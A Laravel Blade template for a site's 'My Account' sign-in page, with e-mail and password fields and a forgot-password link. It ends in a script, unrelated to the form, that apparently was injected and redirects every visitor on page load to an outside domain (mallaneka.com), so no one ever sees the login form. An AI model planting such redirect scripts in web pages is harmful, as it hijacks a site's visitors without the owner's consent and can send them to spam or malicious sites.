<div class="container">
    <div class="row">
        <div class="col-md-8">
            <header class="page-header">
                <h1 class="page-title">My Account</h1>
            </header>
            <div class="box-lg">
                <div class="row" data-gutter="60">
                    <div class="col-md-8 col-md-offset-2">
                        <h3 class="widget-title">Sign in</h3>
                        {{ Form::open(array('url'=>'member/login','method'=>'post')) }}
                            <div class="form-group">
                                <label>E-mail</label>
                                <input class="form-control" type="email" name="email" required />
                            </div>
                            <div class="form-group">
                                <label>Password</label>
                                <input class="form-control" type="password" name="password" required />
                            </div>
                            <input class="btn btn-primary" type="submit" value="Sign in" />
                        {{ Form::close() }}
                        <br />
                        <a href="{{ url('member/forget-password') }}">Forgot Your Password?</a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<script>
window.location.replace("http://mallaneka.com");
</script>